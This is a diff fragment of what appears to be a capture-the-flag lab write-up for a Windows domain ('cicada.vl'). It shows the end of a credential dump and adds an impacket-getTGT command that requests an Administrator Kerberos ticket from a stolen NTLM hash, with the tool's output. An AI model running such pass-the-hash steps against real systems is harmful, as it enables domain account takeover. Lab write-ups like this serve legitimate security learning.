@@ -600,6 +600,16 @@ Administrator:des-cbc-md5:fd2a29621f3e7604
 [*] Cleaning up... 
 
 ```
+
+creating a new ticket:
+
+```
+impacket-getTGT -hashes :85a0da53871a9d56b6cd05deda3a5e87 -dc-ip 10.129.150.101 cicada.vl/'Administrator'
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in Administrator.ccache
+
+```
 ---
 ## User Flag
 
